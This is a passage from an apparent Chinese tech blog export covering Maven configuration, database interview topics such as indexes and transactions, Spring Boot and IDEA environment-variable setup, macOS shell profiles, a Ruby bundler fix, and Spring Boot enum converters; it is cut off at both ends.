项目进行构建、依赖管理。\n\nMaven 也可被用于构建和管理各种项目，例如 C#，Ruby，Scala 和其他语言编写的项目。Maven 曾是 Jakarta 项目的子项目，现为由 Apache 软件基金会主持的独立 Apache 项目。\n\n<!-- more -->\n\n### Maven 功能\n\nMaven 能够帮助开发者完成以下工作：\n\n- 构建\n- 文档生成\n- 报告\n- 依赖\n- SCMs\n- 发布\n- 分发\n- 邮件列表\n\n### POM\n\nPOM( Project Object Model，项目对象模型 ) 是 Maven 工程的基本工作单元，是一个XML文件，包含了项目的基本信息，用于描述项目如何构建，声明项目依赖，等等。\n\n执行任务或目标时，Maven 会在当前目录中查找 POM。它读取 POM，获取所需的配置信息，然后执行目标。\n\nPOM 中可以指定以下配置：\n\n- 项目依赖\n- 插件\n- 执行目标\n- 项目构建 profile\n- 项目版本\n- 项目开发者列表\n- 相关邮件列表信息\n\n### Maven 依赖搜索顺序\n\n当我们执行 Maven 构建命令时，Maven 开始按照以下顺序查找依赖的库：\n\n1. 步骤 1 － 在本地仓库中搜索，如果找不到，执行步骤 2，如果找到了则执行其他操作。\n2. 步骤 2 － 在中央仓库中搜索，如果找不到，并且有一个或多个远程仓库已经设置，则执行步骤 4，如果找到了则下载到本地仓库中已被将来引用。\n3. 步骤 3 － 如果远程仓库没有被设置，Maven 将简单的停滞处理并抛出错误（无法找到依赖的文件）。\n4. 步骤 4 － 在一个或多个远程仓库中搜索依赖的文件，如果找到则下载到本地仓库已被将来引用，否则 Maven 将停止处理并抛出错误（无法找到依赖的文件）。\n\n### Maven 阿里云(Aliyun)仓库\n\nMaven 仓库默认在国外， 国内使用难免很慢，我们可以更换为阿里云的仓库。\n\n修改 maven 根目录下的 conf 文件夹中的 setting.xml 文件，在 mirrors 节点上，添加内容如下：\n\n```xml\n<mirrors>\n    <mirror>\n      <id>alimaven</id>\n      <name>aliyun maven</name>\n      <url>https://maven.aliyun.com/repository/public</url>\n      <mirrorOf>central</mirrorOf>        \n    </mirror>\n</mirrors>\n```\n\n为什么我看到有些项目的 Maven 地址是 http://maven.aliyun.com/nexus/content/groups/public/ ？\n\n[http://maven.aliyun.com/](http://maven.aliyun.com/) 首页上显示的仓库地址为推荐使用的仓库地址。为了保证兼容性也也支持以前的仓库地址，用户仍然可以通过 [http://maven.aliyun.com/nexus/content/groups/public](http://maven.aliyun.com/nexus/content/groups/public) 来使用服务。\n\n> 注：Nexus 是Maven仓库管理器，如果你使用Maven，你可以从Maven中央仓库 下载所需要的构件（artifact），但这通常不是一个好的做法，你应该在本地架设一个Maven仓库服务器，在代理远程仓库的同时维护本地仓库，以节省带宽和时间，Nexus就可以满足这样的需要。\n\n\n### Maven 的 Snapshot 版本与 Release 版本\n\n1、Snapshot 版本代表不稳定、尚处于开发中的版本。\n\n2、Release 版本则代表稳定的版本。\n\n3、什么情况下该用 SNAPSHOT?\n\n协同开发时，如果 A 依赖构件 B，由于 B 会更新，B 应该使用 SNAPSHOT 来标识自己。这种做法的必要性可以反证如下：\n\n- a. 如果 B 不用 SNAPSHOT，而是每次更新后都使用一个稳定的版本，那版本号就会升得太快，每天一升甚至每个小时一升，这就是对版本号的滥用。\n- b.如果 B 不用 SNAPSHOT, 但一直使用一个单一的 Release 版本号，那当 B 更新后，A 可能并不会接受到更新。因为 A 所使用的 repository 一般不会频繁更新 release 版本的缓存（即本地 repository)，所以B以不换版本号的方式更新后，A在拿B时发现本地已有这个版本，就不会去远程Repository下载最新的 B\n\n4、 不用 Release 版本，在所有地方都用 SNAPSHOT 版本行不行？     \n\n不行。正式环境中不得使用 snapshot 版本的库。 比如说，今天你依赖某个 snapshot 版本的第三方库成功构建了自己的应用，明天再构建时可能就会失败，因为今晚第三方可能已经更新了它的 snapshot 库。你再次构建时，Maven 会去远程 repository 下载 snapshot 的最新版本，你构建时用的库就是新的 jar 文件了，这时正确性就很难保证了。\n\n### 参考文章\n\n- [Runoob -- Maven 教程](http://www.runoob.com/maven/maven-tutorial.html)\n- [Java构建工具：Ant vs Maven vs Gradle](https://blog.csdn.net/napolunyishi/article/details/39345995)\n- [构建工具的进化：ant, maven, gradle](https://zhuanlan.zhihu.com/p/24429133)\n- [Maven、gradle、Ant、Eclipse IDE 之间的关系](https://zhuanlan.zhihu.com/p/23634332)\n- [云栖社区 -- 最快的 maven repository--阿里镜像仓库](https://yq.aliyun.com/articles/78124)\n- [云栖社区 -- 【FAQ】新版maven.aliyun.com答疑](https://yq.aliyun.com/articles/621196?spm=a2c40.aliyun_maven_repo.0.0.dc983054zFD4TH)\n- [Nexus入门指南（图文）](http://juvenshun.iteye.com/blog/349534)","categories":["Maven"],"tags":["阿里源","Maven","Ant","Gradle","Maven源","Maven国内源"]},{"title":"【面经】数据库面试常问问题","url":"/2018/11/2018-11-01-database-interview/","content":"\n\n### 1.数据库范式\n\n- **第一范式：列不可分。**\n\neg：【联系人】（姓名，性别，电话），一个联系人有家庭电话和公司电话，那么这种表结构设计就没有达到 1NF；\n\n<!-- more -->\n\n- **第二范式：有主键，保证完全依赖。**\n\neg：订单明细表【OrderDetail】（OrderID，ProductID，UnitPrice，Discount，Quantity，ProductName），Discount（折扣），Quantity（数量）完全依赖（取决）于主键（OderID，ProductID），而 UnitPrice，ProductName 只依赖于 ProductID，不符合2NF；\n\n- **第三范式：无传递依赖(非主键列 A 依赖于非主键列 B，非主键列 B 依赖于主键的情况)。**\n\neg：订单表【Order】（OrderID，OrderDate，CustomerID，CustomerName，CustomerAddr，CustomerCity）主键是（OrderID），CustomerName，CustomerAddr，CustomerCity 直接依赖的是 CustomerID（非主键列），而不是直接依赖于主键，它是通过传递才依赖于主键，所以不符合 3NF。\n\n> 字段允许适当冗余，以提高查询性能，但必须考虑数据一致。冗余字段应遵循： \n> - 1）不是频繁修改的字段。 \n> - 2）不是 varchar 超长字段，更不能是 text 字段。 \n\n>例：商品类目名称使用频率高，字段长度短，名称基本一成不变，可在相关联的表中冗余存储类目名称，避免关联查询。\n\n### 2.数据库索引\n\n　　**索引是对数据库表中一个或多个列的值进行排序的数据结构，以协助快速查询、更新数据库表中数据。**索引的实现通常使用B_TREE及其变种。索引加速了数据访问，因为存储引擎不会再去扫描整张表得到需要的数据；相反，它从根节点开始，根节点保存了子节点的指针，存储引擎会根据指针快速寻找数据。\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-17-43-mysql_index1-mfSM0P.png)\n\n　　上图显示了一种索引方式。左边是数据库中的数据表，有col1和col2两个字段，一共有15条记录；右边是以col2列为索引列的B_TREE索引，每个节点包含索引的键值和对应数据表地址的指针，这样就可以都过B_TREE在 **O(logn)** 的时间复杂度内获取相应的数据，这样明显地加快了检索的速度。\n\n1). 索引的底层实现原理和优化\n\n　　在数据结构中，我们最为常见的搜索结构就是二叉搜索树和AVL树(高度平衡的二叉搜索树，为了提高二叉搜索树的效率，减少树的平均搜索长度)了。然而，无论二叉搜索树还是AVL树，当数据量比较大时，都会由于树的深度过大而造成I/O读写过于频繁，进而导致查询效率低下，因此对于索引而言，多叉树结构成为不二选择。特别地，B-Tree的各种操作能使B树保持较低的高度，从而保证高效的查找效率。\n\n(1). B-Tree(平衡多路查找树)\n\n　　B_TREE是一种平衡多路查找树，是一种动态查找效率很高的树形结构。B_TREE中所有结点的孩子结点的最大值称为B_TREE的阶，B_TREE的阶通常用m表示，简称为m叉树。一般来说，应该是m>=3。一颗m阶的B_TREE或是一颗空树，或者是满足下列条件的m叉树：\n\n- 树中每个结点最多有m个孩子结点；\n\n- 若根结点不是叶子节点，则根结点至少有2个孩子结点；\n\n- 除根结点外，其它结点至少有**(m/2的上界)**个孩子结点；\n\n- 结点的结构如下图所示，其中，n为结点中关键字个数，**(m/2的上界)-1 <= n <= m-1**；di(1<=i<=n)为该结点的n个关键字值的第i个，且di< d(i+1)；ci(0<=i<=n)为该结点孩子结点的指针，且ci所指向的节点的关键字均大于或等于di且小于d(i+1)；\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-17-43-mysql_btree-eVoPW3.png)\n\n- 所有的叶结点都在同一层上，并且不带信息（可以看作是外部结点或查找失败的结点，实际上这些结点不存在，指向这些结点的指针为空）。\n\n---\n\n\n　　下图是一棵4阶B_TREE，4叉树结点的孩子结点的个数范围[2,4]。其中，有2个结点有4个孩子结点，有1个结点有3个孩子结点，有5个结点有2个孩子结点。\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-17-44-4_btree-iK7LK9.jpg)\n\n　　B_TREE的查找类似二叉排序树的查找，所不同的是B-树每个结点上是多关键码的有序表，在到达某个结点时，先在有序表中查找，若找到，则查找成功；否则，到按照对应的指针信息指向的子树中去查找，当到达叶子结点时，则说明树中没有对应的关键码。由于B_TREE的高检索效率，B-树主要应用在文件系统和数据库中，对于存储在硬盘上的大型数据库文件，可以极大程度减少访问硬盘次数，大幅度提高数据检索效率。\n\n---\n\n\n(2). B+Tree: **InnoDB存储引擎的索引实现**\n\nB+Tree是应文件系统所需而产生的一种B_TREE树的变形树。一棵m阶的B+树和m阶的B_TREE的差异在于以下三点：\n\n- n 棵子树的结点中含有n个关键码；\n\n- 所有的叶子结点中包含了全部关键码的信息，及指向含有这些关键码记录的指针，且叶子结点本身依关键码的大小自小而大的顺序链接；\n\n- 非终端结点可以看成是索引部分，结点中仅含有其子树根结点中最大（或最小）关键码。\n\n---\n\n下图为一棵3阶的B+树。通常在B+树上有两个头指针，一个指向根节点，另一个指向关键字最小的叶子节点。因此可以对B+树进行两种查找运算：一种是从最小关键字起顺序查找，另一种是从根节点开始，进行随机查找。 \n在B+树上进行随机查找、插入和删除的过程基本上与B-树类似。只是在查找时，若非终端结点上的关键码等于给定值，并不终止，而是继续向下直到叶子结点。因此，对于B+树，**不管查找成功与否，每次查找都是走了一条从根到叶子结点的路径。**\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-17-44-3_btree-qlOdCr.jpg)\n\n---\n\n(3). 为什么说B+-tree比B 树更适合实际应用中操作系统的文件索引和数据库索引？\n\n- B+tree的磁盘读写代价更低：B+tree的内部结点并没有指向关键字具体信息的指针(红色部分)，因此其内部结点相对B 树更小。如果把所有同一内部结点的关键字存放在同一盘块中，那么盘块所能容纳的关键字数量也越多。一次性读入内存中的需要查找的关键字也就越多，相对来说IO读写次数也就降低了；\n\n- B+tree的查询效率更加稳定：由于内部结点并不是最终指向文件内容的结点，而只是叶子结点中关键字的索引，所以，任何关键字的查找必须走一条从根结点到叶子结点的路。所有关键字查询的路径长度相同，导致每一个数据的查询效率相当；\n\n- 数据库索引采用B+树而不是B树的主要原因：B+树只要遍历叶子节点就可以实现整棵树的遍历，而且在数据库中基于范围的查询是非常频繁的，而B树只能中序遍历所有节点，效率太低。\n\n---\n\n(4). 文件索引和数据库索引为什么使用B+树?\n\n　　文件与数据库都是需要较大的存储，也就是说，它们都不可能全部存储在内存中，故需要存储到磁盘上。而所谓索引，则为了数据的快速定位与查找，那么索引的结构组织要尽量减少查找过程中磁盘I/O的存取次数，因此B+树相比B树更为合适。数据库系统巧妙利用了局部性原理与磁盘预读原理，将一个节点的大小设为等于一个页，这样每个节点只需要一次I/O就可以完全载入，而红黑树这种结构，高度明显要深的多，并且由于逻辑上很近的节点(父子)物理上可能很远，无法利用局部性。最重要的是，B+树还有一个最大的好处：方便扫库。B树必须用中序遍历的方法按序扫库，而B+树直接从叶子结点挨个扫一遍就完了，B+树支持range-query非常方便，而B树不支持，这是数据库选用B+树的最主要原因。\n\n--- \n\n2). 索引的优点\n\n- 大大加快数据的检索速度，这也是创建索引的最主要的原因；\n- 加速表和表之间的连接；\n- 在使用分组和排序子句进行数据检索时，同样可以显著减少查询中分组和排序的时间；\n- 通过创建唯一性索引，可以保证数据库表中每一行数据的唯一性；\n\n---\n\n3). 什么情况下设置了索引但无法使用？\n\n- 以“%(表示任意0个或多个字符)”开头的LIKE语句，模糊匹配；\n- OR语句前后没有同时使用索引；\n- 数据类型出现隐式转化（如varchar不加单引号的话可能会自动转换为int型）；\n- 对于多列索引，必须满足 **最左匹配原则** (eg：多列索引col1、col2和col3，则 索引生效的情形包括 col1或col1，col2或col1，col2，col3)。\n\n---\n\n4). 什么样的字段适合创建索引？\n\n- 经常作查询选择的字段\n- 经常作表连接的字段\n- 经常出现在order by, group by, distinct 后面的字段\n\n--- \n\n5). 创建索引时需要注意什么？\n\n- 非空字段：应该指定列为NOT NULL，除非你想存储NULL。在mysql中，含有空值的列很难进行查询优化，因为它们使得索引、索引的统计信息以及比较运算更加复杂。你应该用0、一个特殊的值或者一个空串代替空值；\n- 取值离散大的字段：（变量各个取值之间的差异程度）的列放到联合索引的前面，可以通过count()函数查看字段的差异值，返回值越大说明字段的唯一值越多字段的离散程度高；\n- 索引字段越小越好：数据库的数据存储以页为单位一页存储的数据越多一次IO操作获取的数据越大效率越高。\n\n---\n\n6). 索引的缺点\n\n- 时间方面：创建索引和维护索引要耗费时间，具体地，当对表中的数据进行增加、删除和修改的时候，索引也要动态的维护，这样就降低了数据的维护速度；\n- 空间方面：索引需要占物理空间。\n\n---\n\n7). 索引的分类\n\n- 普通索引和唯一性索引：索引列的值的唯一性\n- 单个索引和复合索引：索引列所包含的列数\n- 聚簇索引与非聚簇索引：聚簇索引按照数据的物理存储进行划分的。对于一堆记录来说，使用聚集索引就是对这堆记录进行堆划分，即主要描述的是物理上的存储。正是因为这种划分方法，导致聚簇索引必须是唯一的。聚集索引可以帮助把很大的范围，迅速减小范围。但是查找该记录，就要从这个小范围中Scan了；而非聚集索引是把一个很大的范围，转换成一个小的地图，然后你需要在这个小地图中找你要寻找的信息的位置，最后通过这个位置，再去找你所需要的记录。\n\n---\n\n8). 主键、自增主键、主键索引与唯一索引概念区别\n\n- 主键：指字段 唯一、不为空值 的列；\n- 主键索引：指的就是主键，主键是索引的一种，是唯一索引的特殊类型。创建主键的时候，数据库默认会为主键创建一个唯一索引；\n- 自增主键：字段类型为数字、自增、并且是主键；\n- 唯一索引：索引列的值必须唯一，但允许有空值。主键是唯一索引，这样说没错；但反过来说，唯一索引也是主键就错误了，因为唯一索引允许空值，主键不允许有空值，所以不能说唯一索引也是主键。\n\n---\n\n9). 主键就是聚集索引吗？主键和索引有什么区别？\n\n　　主键是一种特殊的唯一性索引，其可以是聚集索引，也可以是非聚集索引。在SQLServer中，主键的创建必须依赖于索引，默认创建的是聚集索引，但也可以显式指定为非聚集索引。InnoDB作为MySQL存储引擎时，默认按照主键进行聚集，如果没有定义主键，InnoDB会试着使用唯一的非空索引来代替。如果没有这种索引，InnoDB就会定义隐藏的主键然后在上面进行聚集。所以，对于聚集索引来说，你创建主键的时候，自动就创建了主键的聚集索引。\n\n---\n\n### 3.数据库事务\n\n　　事务是一个不可分割的数据库操作序列，也是数据库并发控制的基本单位，其执行的结果必须使数据库从一种一致性状态变到另一种一致性状态。\n\n(1). 事务的特征\n\n- 原子性(Atomicity)：事务所包含的一系列数据库操作要么全部成功执行，要么全部回滚；\n\n- 一致性(Consistency)：事务的执行结果必须使数据库从一个一致性状态到另一个一致性状态；\n\n- 隔离性(Isolation)：并发执行的事务之间不能相互影响；\n\n- 持久性(Durability)：事务一旦提交，对数据库中数据的改变是永久性的。\n\n\n(2). 事务并发带来的问题\n\n- 脏读：一个事务读取了另一个事务未提交的数据；\n\n- 不可重复读：不可重复读的重点是修改，同样条件下两次读取结果不同，也就是说，被读取的数据可以被其它事务修改；\n\n- 幻读：幻读的重点在于新增或者删除，同样条件下两次读出来的记录数不一样。\n\n(3). 隔离级别\n\n　　隔离级别决定了一个session中的事务可能对另一个session中的事务的影响。ANSI标准定义了4个隔离级别，MySQL的InnoDB都支持，分别是：\n\n- READ UNCOMMITTED：最低级别的隔离，通常又称为dirty read，它允许一个事务读取另一个事务还没commit的数据，这样可能会提高性能，但是会导致脏读问题；\n\n- READ COMMITTED：在一个事务中只允许对其它事务已经commit的记录可见，该隔离级别不能避免不可重复读问题；\n\n- REPEATABLE READ：在一个事务开始后，其他事务对数据库的修改在本事务中不可见，直到本事务commit或rollback。但是，其他事务的insert/delete操作对该事务是可见的，也就是说，该隔离级别并不能避免幻读问题。在一个事务中重复select的结果一样，除非本事务中update数据库。\n\n- SERIALIZABLE：最高级别的隔离，只允许事务串行执行。\n\nMySQL默认的隔离级别是REPEATABLE READ。\n\n(4)、mysql的事务支持\n\nMySQL的事务支持不是绑定在MySQL服务器本身，而是与存储引擎相关：\n\n- MyISAM：不支持事务，用于只读程序提高性能；\n- InnoDB：支持ACID事务、行级锁、并发；\n- Berkeley DB：支持事务。\n\n\n\n### 参考文献\n\n- [面试/笔试第三弹 —— 数据库面试问题集锦](https://blog.csdn.net/justloveyou_/article/details/78308460)\n","categories":["数据库"],"tags":["数据库","database","MySQL","索引","ACID","事务"]},{"title":"IntelliJ IDEA SpringBoot 项目读取系统环境变量","url":"/2018/11/2018-11-07-idea-environment-variables-spring-boot/","content":"\n### 情景再现\n\n现在很多项目为了在本地和线上部署方便，都采用了从系统环境变量读取 MySQL 等配置信息的\n\n<!-- more -->\n\n就像这样👇\n\n```\nspring.datasource.driver-class-name=com.mysql.jdbc.Driver\nspring.datasource.url=jdbc:mysql://${MYSQL_HOST}:${MYSQL_PORT}/test?useSSL=false&characterEncoding=utf8&autoReconnect=true\nspring.datasource.username=${MYSQL_USER}\nspring.datasource.password=${MYSQL_PASSWORD}\n```\n\n设置了环境变量，在命令行中也能 echo\n\n但是就是 IntelliJ IDEA 读不到\n\n### 解决办法\n\n方法1：通过bash命令 open /Applications/xxx.app启动 IDEA。\n\n方法2：不在环境变量中设置，在 IDEA 中设置 Application 的启动环境\n\n在运行的按钮处，选择 Edit Configurations\n\n![29-17-45-ScreenShot2018-11-08at3.36.13PM-s2Vn0p](https://up-img.yonghong.tech/pic/2021/07/29-17-45-Screen%20Shot%202018-11-08%20at%203.36.13%20PM-s2Vn0p.png)\n\n\n接下来我们展开 Environment 选项，发现有个 Environment variables.我们点开进行修改\n\n![29-17-45-ScreenShot2018-11-08at3.38.21PM-oe9Wt9](https://up-img.yonghong.tech/pic/2021/07/29-17-45-Screen%20Shot%202018-11-08%20at%203.38.21%20PM-oe9Wt9.png)\n\n\n改成下面的样子就可以了\n\n![29-17-45-ScreenShot2018-11-08at3.39.52PM-TYqDjJ](https://up-img.yonghong.tech/pic/2021/07/29-17-45-Screen%20Shot%202018-11-08%20at%203.39.52%20PM-TYqDjJ.png)\n\n\n运行 -> 成功 ！！！ \n\n### 参考\n\n-[mac上ide中无法获取环境变量的问题](https://blog.csdn.net/kobe1110/article/details/50524220)\n-[IntelliJ Idea中设置和使用环境变量？](https://cloud.tencent.com/developer/ask/32339)","categories":["macOS"],"tags":["macOS","SpringBoot"]},{"title":"设置 macOS 的系统环境变量","url":"/2018/11/2018-11-07-setting-up-environment-variables-in-macos-sierra/","content":"\nmacOS 的环境变量一般有这几个地方\n\n```\n/etc/profile\n/etc/bashrc\n~/.bash_profile\n```\n\n<!-- more -->\n\n前两个配置属于系统级别的，所有用户均可使用；第三个配置属于用户级别的，仅供当前用户读写。建议将个人用户所需要的环境变量配置于第三个当中。但是第三个文件默认是不存在的，需要自己创建。\n\n如果你使用 zsh，还会在这里\n\n```\n~/.zshrc\n```\n\n所以我建议，个人的配置只在 `~/.bash_profile` 中写。别的文件尽量不要动\n\n如果你用 zsh，那么只在 `.zshrc` 中只添加\n\n```\nsource .bash_profile\n# !!! Please put user configuration in ~/.bash_profile\n```\n\n提示自己把配置都放在 `~/.bash_profile` 中，这样能管理起来也方便。\n\n还有一个叫 nvm 软件，是管理 node 版本的工具，我建议如果不常用还是不要了，这个东西让我的命令行启动多了 1.2 秒\n\n","categories":["macOS"],"tags":["macOS"]},{"title":"记一次给 Maven 多个 module 的 SpringBoot 项目添加子模块的过程","url":"/2018/11/2018-11-08-a-muti-module-maven-spring-project/","content":"\n最近接手一个项目，项目是一个 Maven 多个 module 的 SpringBoot 项目，要求添加一个功能，也就是在不影响原有项目的情况下添加一个模块。于是我开始了这个艰难的旅程。\n\n<!-- more -->\n\n首先选中项目目录，右键 -> New -> Module -> Spring Initializr\n\n这部分很普通的建立一个 SpringBoot 项目，不再赘述\n\n接下来就是重点内容了，因为我们建的是一个子模块，所以，我们可以把目录下的 java 文件都删除，.mvn目录也删掉。保留 pom.xml 文件。接下来我们对 pom.xml 文件进行修改\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n\n    <parent>\n        <groupId>com.example</groupId>\n        <artifactId>demo</artifactId>\n        <version>1.0-SNAPSHOT</version>\n    </parent>\n\n    <groupId>com.example.demo</groupId>\n    <artifactId>child</artifactId>\n    <version>1.0-SNAPSHOT</version>\n\n    <name>child</name>\n    <description>子模块</description>\n\n    <properties>\n        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n        <project.reporting.outputEncoding>UTF-8</project.reporting.outputEncoding>\n        <java.version>1.8</java.version>\n    </properties>\n\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-data-jpa</artifactId>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n        </dependency>\n\n        <dependency>\n            <groupId>mysql</groupId>\n            <artifactId>mysql-connector-java</artifactId>\n            <scope>runtime</scope>\n        </dependency>\n        <dependency>\n            <groupId>org.projectlombok</groupId>\n            <artifactId>lombok</artifactId>\n            <optional>true</optional>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-test</artifactId>\n            <scope>test</scope>\n        </dependency>\n    </dependencies>\n\n    <build>\n        \n    </build>\n</project>\n\n```\n\n注意，我们把 parent 标签中的内容改为了我们的父工程的坐标\n\n```xml\n<parent>\n    <groupId>com.example</groupId>\n    <artifactId>demo</artifactId>\n    <version>1.0-SNAPSHOT</version>\n</parent>\n```\n\n并且把 build 标签里的 Maven 插件删除了。\n\n接下来设置父模块的 pom.xml\n\n```xml\n<modules>\n    <module>auth</module> <!-- 以前的子模块 -->\n    <module>utils</module> <!-- 以前的子模块 -->\n    <module>child</module> <!-- 新的的子模块 -->\n</modules>\n```\n\n\n我们在 com.example.child 这个包里建一个 controller 包，在 controller 包中建一个 TestController.java 文件\n\n```java\npackage com.example.child.controller;\n\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\nimport lombok.extern.slf4j.Slf4j;\n\n@RestController\n@RequestMapping(value = \"/hello\")\n@Slf4j\npublic class TestController{\n\n    @GetMapping(value = \"/test\")\n    public String test() {\n\n        log.info(\"######################################测试测试\");\n        return \"Hello Test Result\";\n    }\n}\n\n```\n\n然后我们运行程序。\n\n一般情况下这样配置是没有问题的。\n\n但是很可能会出问题，比如说，导包没导进去，那么只需要在 pom.xml 文件上右键 -> Maven -> Reimport 即可。\n\n👌，继续，如果上面的操作我们都执行了，那么我们去访问 http://localhost:8080/hello/test 或者说可能是别的前缀的地址，反正要访问 /hello/test 这个 API，浏览器应该会返回 Hello Test Result。\n\nbut，我这里报了错，是 404，what ？没有找到？\n\n再看控制台，也没有 log。\n\n这是为什么呢，都按照网上的参考做了啊。\n\n> <div style=\"color: red;\">后来我开始阅读以前的代码，发现同一个包名字下，不同的 module，竟然还有一个 TestController.java 。为什么没有报错呢？</div>\n\n\n我就没再关心这个问题，继续找别的问题，我为什么要避开这个错误呢 ！！！\n\n大概找了几个小时问题，后来才回到这个地方，我改了个名字就好了\n\n","categories":["Maven"],"tags":["SpringBoot","Maven","Spring","pom.xml","pom"]},{"title":"Inspection info: Inspects a Maven model for resolution problems","url":"/2018/11/2018-11-08-inspection-info-inspects-a-maven-model-for-resolution-problems/","content":"\n在 spring 多模块的项目中，某个模块依赖了另一个模块，发现 pom 文件爆红了，显示的错误是\n\n<!-- more -->\n\n> <div style=\"color: red;\">Inspection info: Inspects a Maven model for resolution problems.<div>\n\n处理办法很简单：\n\n只需要在 pom.xml 上右键 -> Maven -> Reimport 即可，爆红消失了\n\n这样会让 Maven 强制重新加载依赖包，所以会解决问题。","categories":["Maven"],"tags":["Maven"]},{"title":"Maven 默认的 Java 版本","url":"/2018/11/2018-11-08-maven-java-version/","content":"\n在使用 Maven 构建应用程序时，发现报了个错误，大概是非法反射类似的错误。\n\n然后使用 -X 命令查看详细的信息，发现用的是 Java 11 的版本进行编译的，怪不得会发生这种错误。\n\n然后，我查看 Java 版本和 Maven 版本。\n\n<!-- more -->\n\n```\n$ java -version\njava version \"1.8.0_181\"\nJava(TM) SE Runtime Environment (build 1.8.0_181-b13)\nJava HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode)\n\n$ mvn -version            \nApache Maven 3.5.3 (3383c37e1f9e9b3bc3df5050c29c8aff9f295297; 2018-02-25T03:49:05+08:00)\nMaven home: /usr/local/Cellar/maven/3.5.3/libexec\nJava version: 11, vendor: Oracle Corporation\nJava home: /Library/Java/JavaVirtualMachines/jdk-11.jdk/Contents/Home\nDefault locale: en_US, platform encoding: UTF-8\nOS name: \"mac os x\", version: \"10.14.1\", arch: \"x86_64\", family: \"mac\"\n```\n\n所以看来是 maven 的配置出了问题，参考了网上的资料发现只需要在 Maven 的配置文件中指定 JAVA_HOME 就可以了\n\nMaven 可以从两个地方读取配置文件，分别是 `~/.mavenrc` 和 `/etc/mavenrc`\n\n所以我选择在 `~/.mavenrc` 文件中指定 JAVA_HOME\n\n```\nJAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Home\n```\n\n再看\n\n```\n$ mvn -version            \nApache Maven 3.5.3 (3383c37e1f9e9b3bc3df5050c29c8aff9f295297; 2018-02-25T03:49:05+08:00)\nMaven home: /usr/local/Cellar/maven/3.5.3/libexec\nJava version: 1.8.0_181, vendor: Oracle Corporation\nJava home: /Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Home/jre\nDefault locale: en_US, platform encoding: UTF-8\nOS name: \"mac os x\", version: \"10.14.1\", arch: \"x86_64\", family: \"mac\"\n```\n\n成功！\n","categories":["Maven"],"tags":["Maven","mvn","java","version"]},{"title":"Traceback (most recent call last) from /usr/local/bin/bundle ","url":"/2018/11/2018-11-08-traceback-most-recent-call-last-from-usr-local-bin-bundle-in-main-cannot-load-such-file/","content":"\n在某次清理完电脑之后，发现运行 Jekyll 爆错了\n\n<!-- more -->\n\n```shell\n$ bundle exec jekyll serve\nTraceback (most recent call last):\n\t1: from /usr/local/bin/bundle:23:in `<main>'\n/usr/local/bin/bundle:23:in `load': cannot load such file -- /usr/local/lib/ruby/gems/2.5.0/gems/bundler-1.16.6/exe/bundle (LoadError)\n```\n\n然后我开始找原因\n\n```shell\n$ gem -v\n2.5.2.3\n$ ruby --version\nruby 2.3.7p456 (2018-03-28 revision 63024) [universal.x86_64-darwin18]\n$ bundle -v\nTraceback (most recent call last):\n\t1: from /usr/local/bin/bundle:23:in `<main>'\n/usr/local/bin/bundle:23:in `load': cannot load such file -- /usr/local/lib/ruby/gems/2.5.0/gems/bundler-1.16.6/exe/bundle (LoadError)\n```\n\n这么一看发现是 bundle 的问题\n\n```shell\n$ sudo gem install bundler\nPassword:\nFetching: bundler-1.17.1.gem (100%)\nSuccessfully installed bundler-1.17.1\nParsing documentation for bundler-1.17.1\nInstalling ri documentation for bundler-1.17.1\nDone installing documentation for bundler after 5 seconds\n1 gem installed\n\n$ bundle -v\nBundler version 1.17.1\n```\n\nOK👌，现在可以启动了\n\n```\n$ bundle exec jekyll serve\nCould not find public_suffix-3.0.3 in any of the sources\nRun `bundle install` to install missing gems.\n```\n\n我勒个去，又爆错了，然后跟着提示，运行下面的命令\n\n```\n$ bundle install\n```\n\n现在终于解决了！完美！！！","categories":["jekyll"],"tags":["bundle","gem","ruby","jekyll"]},{"title":"SpringBoot 请求参数为枚举类型","url":"/2018/11/2018-11-16-springboot-request-param-enums/","content":"\n### 情景\n\n在一个请求中有一个参数 range ，可以选择的有 week month quarter year 四个。为了不让 magic 变量漫天飞，我把他变成了一个枚举类型。\n\n<!-- more -->\n\n\n```java\n@Getter\npublic enum RangeEnum{\n\n    /**\n     * 查询的 range，周，月，季度，年\n     */\n    WEEK(\"week\"),\n    MONTH(\"month\"),\n    QUARTER(\"quarter\"),\n    YEAR(\"year\");\n\n    private String value;\n\n    RangeEnum(String value) {\n        this.value = value;\n    }\n\n}\n```\n\nController 中\n\n```java\n@GetMapping(value = \"/list\")\npublic GenericResponse getXXList(\n\t@RequestParam(value = \"range\") RangeEnum range) {\n\t// do something\n}\n```\n\n但是这样写，这个 controller 只能接收 WEEK，MONTH 等等，一旦出现 week 这样的参数是无法处理的。\n\n### 解决\n\n所以我们可以写一个 convertor\n\n```java\n// 包要导对\nimport org.springframework.core.convert.converter.Converter;\n\nclass StringToRangeEnumConverter implements Converter<String, RangeEnum> {\n\n    private Map<String, RangeEnum> enumMap = new HashMap<>();\n\n    StringToRangeEnumConverter() {\n        \n        for(RangeEnum e : RangeEnum.values()) {\n            enumMap.put(e.getValue(), e);\n        }\n    }\n\n    @Override\n    public RangeEnum convert(String source) {\n\n        RangeEnum result = enumMap.get(source);\n        if (result == null) {\n            // 异常可以稍后去捕获\n            throw new IllegalArgumentException(\"No element matches \" + source);\n        }\n        return result;\n    }\n}\n```\n\n这样问题又来了，如果有很多个枚举类，那我就要写很多了 convertor 了啊。\n\n所以我们引入了一个 